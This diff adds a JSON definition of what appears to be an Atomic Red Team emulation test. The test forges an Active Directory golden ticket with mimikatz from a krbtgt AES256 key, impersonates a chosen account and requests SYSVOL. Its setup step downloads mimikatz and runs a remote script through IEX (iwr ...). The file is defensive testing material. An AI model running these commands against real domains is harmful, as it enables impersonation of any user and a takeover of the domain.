@@ -1,0 +1,110 @@
+{
+  "id": "9726592a-dabc-4d4d-81cd-44070008b3af",
+  "name": "Crafting Active Directory golden tickets with mimikatz",
+  "description": "Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.\nThis test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "e887fecd-9057-462b-8be4-a55fd59862b6",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\n# get current domain SID if default was used\n$domain_sid = \"#{domain_sid}\"\nIf ($domain_sid -Match \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n\u003e%TEMP%\\golden.txt 2\u003e\u00261 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  #{mimikatz_path} \"kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt\" \"exit\"\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\#{domain}\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "081f7c01-afb6-45be-b1ab-5434f9e1d3be",
+      "name": "Check dependency 1/1",
+      "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "11fcb27b-1a9b-4b3d-b2b4-3b571b77558c",
+      "name": "Resolve dependency 1/1",
+      "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "965bb377-0c75-4af8-8272-c276828d4765",
+      "name": "Re-check dependency 1/1",
+      "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "081f7c01-afb6-45be-b1ab-5434f9e1d3be",
+      "p": "on-success",
+      "o": "e887fecd-9057-462b-8be4-a55fd59862b6"
+    },
+    {
+      "s": "081f7c01-afb6-45be-b1ab-5434f9e1d3be",
+      "p": "on-failure",
+      "o": "11fcb27b-1a9b-4b3d-b2b4-3b571b77558c"
+    },
+    {
+      "s": "11fcb27b-1a9b-4b3d-b2b4-3b571b77558c",
+      "p": "on-success",
+      "o": "965bb377-0c75-4af8-8272-c276828d4765"
+    },
+    {
+      "s": "965bb377-0c75-4af8-8272-c276828d4765",
+      "p": "on-failure",
+      "o": "e887fecd-9057-462b-8be4-a55fd59862b6"
+    }
+  ],
+  "tags": [
+    "T1558.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "domain_sid",
+      "type": "string",
+      "description": "SID of the targeted domain, if you keep default it will automatically get the current domain SID",
+      "value": "S-1-5-21-DEFAULT"
+    },
+    {
+      "name": "domain",
+      "type": "string",
+      "description": "Targeted Active Directory domain FQDN",
+      "value": "%userdnsdomain%"
+    },
+    {
+      "name": "account",
+      "type": "string",
+      "description": "Account to impersonate",
+      "value": "goldenticketfakeuser"
+    },
+    {
+      "name": "krbtgt_aes256_key",
+      "type": "string",
+      "description": "Krbtgt AES256 key (you will need to set to match your krbtgt key for your domain)",
+      "value": "b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9"
+    },
+    {
+      "name": "mimikatz_path",
+      "type": "path",
+      "description": "Mimikatz windows executable",
+      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe"
+    }
+  ]
+}
